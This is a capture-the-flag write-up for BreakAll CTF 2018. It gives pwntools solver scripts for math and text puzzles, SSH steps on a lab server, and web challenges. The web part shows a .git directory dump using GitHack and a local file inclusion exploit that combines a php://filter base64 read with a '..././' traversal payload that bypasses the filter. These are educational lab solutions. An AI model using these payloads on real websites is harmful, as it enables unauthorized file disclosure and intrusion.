BreakAll CTF 2018-1
===
* [hackmd](https://hackmd.io/0XjUKDdsST6LUkIsYyRcHg?view)

# Misc

## get-the-root

* ### Description
```shell
===== Welcome to Get the Root =====
I need you to solve some polynomial for me, just give me one of the roots of the polynomial
----- wave : example -----
polynomial : 1 -2 1 (which means x^2 - 2x + 1)
root : 1 (just one of the roots, and gurantee to be integer)
----- wave : 1/100 -----
polynomial : 1 -28 -13291 240206 40004708 95341064 -2677744160
root : 
```

* ### Solve

```python
from pwn import *
import numpy as np
import math

r = remote("140.110.112.29", 5122)
r.recvlines(6)
for i in range(0,100):
  r.recvuntil("al : ")
  rc = r.recvline()[:-1]
  ls = rc.split(' ')
  print(rc)
  print(ls)
  root = int(round(float(np.roots(ls)[0])))
  print(root)
  r.sendline(str(root))

r.interactive()
```

## hurry-up

* ### Description
```
Hurry up, winter is coming...
===== wave 1/100 =====
shift every alphabet in the word by +7 : MAX FTG PAH ITLLXL MAX LXGMXGVX LAHNEW LPBGZ MAX LPHKW
```

* ### Solve

```python
from pwn import *

r = remote("140.110.112.29", 5123)
r.recvlines(1)
for i in range(0,100):
  s = ''
  r.recvuntil("word by ")
  ele = r.recv(1)
  shift = r.recvuntil(" ")[:-1]
  r.recvuntil(": ")
  string = r.recvline()[:-1]
  print(ele, shift, string)
  for j in range(0, len(string)):
    if string[j].isalpha():
      if ele=='+':
	s += chr(65+((ord(string[j])-65+int(shift))%26))
      else:
        s += chr(65+((ord(string[j])-65+26-int(shift))%26))
    else:
      s += string[j]
  print(s)
  r.sendline(s)

r.interactive()
```

## lambda

* ### Description
```
===== Welcome to lambda =====
give you x, help us calculate f(x)
here is some functions f
f0(x) = 3x^2 + x + 3
f1(x) = 5x^2 + 8
f2(x) = 4x^3 + 6x + 6
f3(x) = 7x^3 + 5x^2
f4(x) = x^2 + 4x + 3
----- wave : example -----
function : 1
x = 2
f(x) = 28
----- wave : 1/100 -----
function : 1
x = 173
```

* ### Solve

```python
from pwn import *

r = remote("140.110.112.29", 5124)
r.recvlines(12)
func = {
'0': lambda x: 3*x**2 + x + 3,
'1': lambda x: 5*x**2 + 8,
'2': lambda x: 4*x**3 + 6*x + 6,
'3': lambda x: 7*x**3 + 5*x**2,
'4': lambda x: x**2 + 4*x + 3
}
for i in range(0,100):
  r.recvuntil("tion : ")
  f = r.recvline()[:-1]
  r.recvuntil("x = ")
  x = r.recvline()[:-1]
  print(f, x)
  ans = func[f](int(x))
  print(ans)
  r.sendline(str(ans))

r.interactive()
```

## translation

* ### Description
```
========== Welcome ==========
I give you a string, you need to translate it to integer in big endian
----- wave : example -----
string : ab (all the string will contain lowercase alphabets only)
integer : 24930 ( which comes from 97 * 256 + 98 = 24930)
----- wave : 1/100 -----
string : spiderman
integer : 
```

* ### Solve

```python
from pwn import *

r = remote("140.110.112.29", 5125)
r.recvlines(5)
for i in range(0,100):
  count = 0
  r.recvuntil("string : ")
  s = r.recvline()[:-1]
  #print(s)
  for j in range(len(s)-1, -1, -1):
    count += ord(s[j]) * (256**(len(s)-1-j))
    print(count)
  r.sendline(str(count))

r.interactive()
```

## ooxx (unsolved)

## temperature

* ### Description
```
===== Welcome =====
I need you to transform from Fahrenheit to Celsius
----- wave : example -----
Fahrenheit : 10 (guarantee to be integer)
Celsius : -110/9
----- wave : 1/100 -----
Fahrenheit : -91
Celsius : 
```

* ### Solve

```python
from pwn import *

r = remote("140.110.112.29", 5127)
r.recvlines(5)
for i in range(0,100):
  r.recvuntil("heit : ")
  f = r.recvline()[:-1]
# print(f)
  c = str((int(f)-32)*5)
  ans = c + '/9'
  r.sendline(ans)

r.interactive()
```

## alphabet

* ### Description
```
===== Welcome to alphabet counter =====
We got some alphabet to count
Can you help us?
----- wave 1/100 -----
How many p in nfobqjvengzwdhiicxkvbzebyixfjtutcaebaolcqytahkdkac
```


* ### Solve
```python
from pwn import *

r = remote("140.110.112.29", 5128)
r.recvlines(3)
for i in range(0,100):
  count = 0
  r.recvuntil("many ")
#  print(le)
  alpha = r.recv(1)
  r.recvuntil(" in ")
  string = r.recvline()[:-1]
  print(alpha, string)
  for j in range(0, len(string)):
    if string[j] == alpha:
      count += 1
  r.sendline(str(count))

r.interactive()
```

## imposters (unsolved)

## pi

* ### Description
```
===== Welcome to pi calculator =====
give me pi with certain length
----- wave example -----
L = 5
3.1415
----- wave 1/100 -----
L = 25
```

* ### Solve

```python
from pwn import *

r = remote("140.110.112.29", 5130)
r.recvlines(5)
# pi 是直接上網找的
pi = "3.14159 26535 89793 23846 26433 83279 50288 41971 69399 37510 58209 74944 59230 78164 06286 20899 86280 34825 34211 70679 82148 08651 32823 06647 09384 46095 50582 23172 53594 08128 48111 74502 84102 70193 85211 05559 64462 29489 54930 38196".replace(' ','')
for i in range(0,100):
  s = ''
  r.recvuntil(" = ")
  l = int(r.recvline()[:-1])
  s = int(pi[2:l+1])
  print(int(pi[l+1]))
  if int(pi[l+1])>4 and l!=31:  # 不知道為什麼在31位時，四捨五入會爆炸，所以跳過
    s += 1
  ans = str('3.'+str(s))
  print(l, ans, len(ans)) 
  r.sendline(ans) 

r.interactive()
```

## primes (unsolved)

## vending-machine (unsolved)

## Linux-hidden file (linux-1)

* ### Description
資安鑑識人員偵查一台伺服器，發現在/home/lab目錄有重要資料被隱藏，使鑑識人員搜查情資不易，你能夠連至這台伺服器幫忙尋找嗎?

SSH 資訊
IP : 140.110.112.29
Port: 2200

帳號 : lab
密碼 : lab

* ### Solve
```shell
Ice1187$ ssh lab@140.110.112.29 -p 2200
lab@140.110.112.29's password:    # lab
lab@b8c46ce50098:~$ ls -a
.  ..  .bash_logout  .bashrc  .hidden_secret  .profile  ForYou.tar.gz
lab@b8c46ce50098:~$ cat .hidden_secret 
BreakALLCTF{XXXXXXXXXXXXXXXXX}
```

## Linux-tar.gz file (linux- 2)

* ### Description
你知道如何在Linux解壓縮ForYou檔案嗎?

提示 : 檔案位置 /home/lab/ForYou.tar.gz

需在 /tmp 目錄底下建立自己的目錄，再將壓縮檔解壓縮至自己的目錄。
如: /tmp/404040

SSH伺服器資訊
IP : 140.110.112.29
Port: 2200

帳號 : lab
密碼 : lab

* ### Solve
```shell
Ice1187$ ssh lab@140.110.112.29 -p 2200
lab@140.110.112.29's password:    #lab
lab@b8c46ce50098:~$ ls 
ForYou.tar.gz
lab@b8c46ce50098:~$ mkdir /tmp/ice
lab@b8c46ce50098:~$ cp ForYou.tar.gz /tmp/ice
lab@b8c46ce50098:~$ cd /tmp/ice
lab@b8c46ce50098:/tmp/ice$ tar -zxvf ForYou.tar.gz 
secret
lab@b8c46ce50098:/tmp/ice$ cat secret 
BreakALLCTF{XXXXXXXXXXXXXXXXXXXX}
```
---

# Web

## gitleak

用[GitHack](https://github.com/lijiejie/GitHack)直接leak。

```shell
Ice1187$ ls
GitHack.py  lib  README.md
Ice1187$ ./GitHack.py http://140.110.112.29:4004/.git/  # 記得URL裡要加上 .git/
[+] Download and parse index file ...
index.php
phpinfo.php
[OK] phpinfo.php
[OK] index.php
Ice1187$ ls
140.110.112.29_4004  GitHack.py  index  lib  README.md
Ice1187$ cd 140.110.112.29_4004/
Ice1187$ ls
index.php  phpinfo.php
Ice1187$ cat index.php 
...
<pre>
 _______________________
| BreakALLCTF{XXXXXXXXXXXXXXXXXXXX} |
 -----------------------
      \   ^__^
       \  (oo)\_______
          (__)\       )\/\
              ||----w |
              ||     ||
</pre>
```

## easy_lfi

測試之後發現index.php有問題，但php不會顯示，可以用base64導出來。
```shell
Ice1187$ curl http://140.110.112.29:4005/?f=php://filter/read=convert.base64-encode/resource=index.php
...
PGh0bWw+CjxoZWFkPgo8bWV0YSBjaGFyc2V0PSJVVEYtOCI+Cjx0aXRsZT5BcnRpY2xlIFN5c3RlbTwvdGl0bGU+CjwhLS0gQm9vdHN0cmFwIGNvcmUgQ1NTIC0tPgo8bGluayBocmVmPSJodHRwczovL2dldGJvb3RzdHJhcC5jb20vZG9jcy80LjAvZGlzdC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CjwvaGVhZD4KPGJvZHk+CjwhLS0gTmF2YmFyIC0tPgo8aGVhZGVyPgogICAgICA8IS0tIEZpeGVkIG5hdmJhciAtLT4KICAgICAgPG5hdiBjbGFzcz0ibmF2YmFyIG5hdmJhci1leHBhbmQtbWQgbmF2YmFyLWRhcmsgZml4ZWQtdG9wIGJnLWRhcmsiPgogICAgICAgIDxhIGNsYXNzPSJuYXZiYXItYnJhbmQiIGhyZWY9IiMiPk15QkxPRzwvYT4KICAgICAgICA8YnV0dG9uIGNsYXNzPSJuYXZiYXItdG9nZ2xlciIgdHlwZT0iYnV0dG9uIiBkYXRhLXRvZ2dsZT0iY29sbGFwc2UiIGRhdGEtdGFyZ2V0PSIjbmF2YmFyQ29sbGFwc2UiIGFyaWEtY29udHJvbHM9Im5hdmJhckNvbGxhcHNlIiBhcmlhLWV4cGFuZGVkPSJmYWxzZSIgYXJpYS1sYWJlbD0iVG9nZ2xlIG5hdmlnYXRpb24iPgogICAgICAgICAgPHNwYW4gY2xhc3M9Im5hdmJhci10b2dnbGVyLWljb24iPjwvc3Bhbj4KICAgICAgICA8L2J1dHRvbj4KICAgICAgICA8ZGl2IGNsYXNzPSJjb2xsYXBzZSBuYXZiYXItY29sbGFwc2UiIGlkPSJuYXZiYXJDb2xsYXBzZSI+CiAgICAgICAgICA8dWwgY2xhc3M9Im5hdmJhci1uYXYgbXItYXV0byI+CiAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0gYWN0aXZlIj4KICAgICAgICAgICAgICA8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ii9pbmRleC5waHAiPkhvbWU8c3BhbiBjbGFzcz0ic3Itb25seSI+KGN1cnJlbnQpPC9zcGFuPjwvYT4KICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgPGxpIGNsYXNzPSJuYXYtaXRlbSI+CiAgICAgICAgICAgICAgPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSIvP2Y9YWJvdXQucGhwIj5BYmxvdXQ8L2E+CiAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPgogICAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iLz9mPXhkLnBocCI+WEQ8L2E+CiAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICA8L3VsPgogICAgICAgICAgPGZvcm0gY2xhc3M9ImZvcm0taW5saW5lIG10LTIgbXQtbWQtMCI+CiAgICAgICAgICAgIDxpbnB1dCBjbGFzcz0iZm9ybS1jb250cm9sIG1yLXNtLTIiIHR5cGU9InRleHQiIHBsYWNlaG9sZGVyPSJTZWFyY2giIGFyaWEtbGFiZWw9IlNlYXJjaCI+CiAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImJ0biBidG4tb3V0bGluZS1zdWNjZXNzIG15LTIgbXktc20tMCIgdHlwZT0ic3VibWl0Ij5TZWFyY2g8L2J1dHRvbj4KICAgICAgICAgIDwvZm9ybT4KICAgICAgICA8L2Rpdj4KICAgICAgPC9uYXY+CiAgICA8L2hlYWRlcj4KPG1haW4gcm9sZT0ibWFpbiIgY2xhc3M9ImNvbnRhaW5lciI+Cjxicj48YnI+PGJyPjxicj4KICAgICAgICA8P3BocAogICAgICAgIC8vIGhlcmUgaXMgbm8gZmxhZyBRX19fUQogICAgICAgIC8vIGZsYWcgaXMgaW4gL2ZsYWcKICAgICAgICAkZiA9ICRfR0VUWydmJ107CiAgICAgICAgaWYoc3RyaXBvcygkZiwgIi4uLyIpICE9PSBGQUxTRSkgewogICAgICAgICAgICAgICAgZWNobyAiPGRpdiBjbGFzcz0nYWxlcnQgYWxlcnQtZGFuZ2VyJyByb2xlPSdhbGVydCc+T29wcyEgLi4vIHdpbGwgYmUgZmlsdGVyZWQuIFlvdSBhcmUgQmFkIEhhY2tlciE8L2Rpdj4iOwogICAgICAgICAgICAgICAgJGYgPSBzdHJfcmVwbGFjZSgiLi4vIiwiIiwkZik7CiAgICAgICAgfQogICAgICAgIGluY2x1ZGUoJGYpOwogICAgICAgID8+CiAgICAgIDxwcmUgc3R5bGU9ImZvbnQtc2l6ZToyNXB4Ij4KIF9fX19fX19fXwp8IGhhY2sgbWUgfAogLS0tLS0tLS0tCiAgICAgIFwgICBeX19eCiAgICAgICBcICAob28pXF9fX19fX18KICAgICAgICAgIChfXylcICAgICAgIClcL1wKICAgICAgICAgICAgICB8fC0tLS13IHwKICAgICAgICAgICAgICB8fCAgICAgfHwKICAgICAgPC9wcmU+CjwvbWFpbj4KPC9ib2R5Pgo8L2h0bWw+Cgo=
...
```
再拿去[base64 decode](https://www.base64decode.org/)後，看到部分code
```php
<?php
// here is no flag Q___Q
// flag is in /flag
$f = $_GET['f'];
if(stripos($f, "../") !== FALSE) {
    echo "<div class='alert alert-danger' role='alert'>Oops! ../ will be filtered. You are Bad Hacker!</div>";
    $f = str_replace("../","",$f);
}
include($f);
?>
```
flag在`/flag`，但`../`會被替換掉，可以這樣繞過：
```
Ice1187$ curl http://140.110.112.29:4005/?f=php://filter/read=convert.base64-encode/resource=..././..././..././..././..././flag
...
QnJlYWtBTExDVEZ7SG9OWDYySlFoZ0ROOGtFME5wbzR9Cg==
...
```
將`QnJlYWtBTExDVEZ7SG9OWDYySlFoZ0ROOGtFME5wbzR9Cg==`base64 decode之後，就是flag了

##  Developer Tools

* ### Description
資安人員在某公司的網站上發現網站開發人員因為方便開發，而將重要資訊列在前端程式碼中，你能快速的找到這致命的錯誤嗎?

提示1: BreakALLCTF{xxxxxxxxxxx}
提示2: 你清楚知道base64編碼與解碼的原理嗎?
參看維基百科的說明
https://zh.wikipedia.org/wiki/Base64

* ### Solve

f12打開看，就會看到base64 encode的flag了

## Flashing_Redirect

* ### Description
快閃式的重導向(Redirect)總是讓你眼花!

捉住稍縱即逝的機會是你人生必修課題，參加競賽的你已經踏出第一步!恭喜恭喜!
接著你要學習捉住稍縱即逝的網頁。

* ### Solve

```shell=bash
Ice1187$ curl http://140.110.112.29:1005/
...
<a href="jump.php"><button  class="btn btn-lg btn-success btn-block btn-signin" type="submit">你抓不到flag!!!</button></a>
...
```
看到可疑的`jump.php`
```shell=bash
Ice1187$ curl http://140.110.112.29:1005/jump.php
<meta http-equiv="refresh" content="0; url=jump_again.php">
```
再`jump_again.php`
```shell=bash
Ice1187$ curl http://140.110.112.29:1005/jump_again.php
BreakALLCTF{XXXXXXXXXXXXXXXXXXXXX}
恭喜你抓到flag了!!!
```

## HashingService

* ### Description
維基百科說"雜湊函式(或雜湊演算法，又稱雜湊函式，英語：Hash Function)是一種從任何一種資料中建立小的數字「指紋」的方法。
雜湊函式把訊息或資料壓縮成摘要，使得資料量變小，將資料的格式固定下來。該函式將資料打亂混合，重新建立一個叫做雜湊值（hash values，hash codes，hash sums，或hashes）的指紋。雜湊值通常用一個短的隨機字母和數字組成的字串來代表。好的雜湊函式在輸入域中很少出現雜湊衝突。"

SHA-1(Secure Hash Algorithm 512)是一種密碼雜湊函式，InsecureTestingCenter設計Sha1Me服務讓你連線測試你所算出的答案。

請你連線以下位址正確回答問題並取得flag：
nc 140.110.112.29 4112

提示1:有關hash加密雜湊函數說明，請參看維基百科的說明:
https://en.wikipedia.org/wiki/Hash_function
提示2:python支援SHA-512的套件可以讓你很快解出答案。

* ### Solve

```python
from pwn import *
import hashlib as hl

r = remote("140.110.112.29", 4112)
r.recvuntil("Me:")
plain = r.recvline()[:-1]
print(plain)
h = hl.sha512()
h.update(str(plain))
ans = str(h.hexdigest())
print(ans)
r.sendline(ans)

r.interactive()
```


